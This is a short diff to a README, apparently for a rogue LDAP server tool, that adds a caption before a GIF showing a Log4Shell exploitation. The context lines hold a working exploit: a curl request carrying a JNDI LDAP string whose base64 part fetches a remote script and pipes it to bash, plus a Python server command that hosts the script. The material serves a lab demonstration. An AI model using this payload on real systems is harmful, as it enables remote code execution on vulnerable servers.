@@ -115,6 +115,8 @@ python3 -m http.server 8085
 curl -s -X POST http://192.168.1.6:8080/lol -H "Content-type:application/json" -d "{\"vuln\":\"\${jndi:ldap://192.168.1.6:6389/JChjdXJsIDE5Mi4xNjguMS42OjgwODV8YmFzaCk=}\"}"
 ```
 
+The full log4shell exploitation can be seen below  
+
 ![alt text](https://github.com/twelvesec/RogueLDAP/blob/main/images/log4shell-expl.gif)
 
 
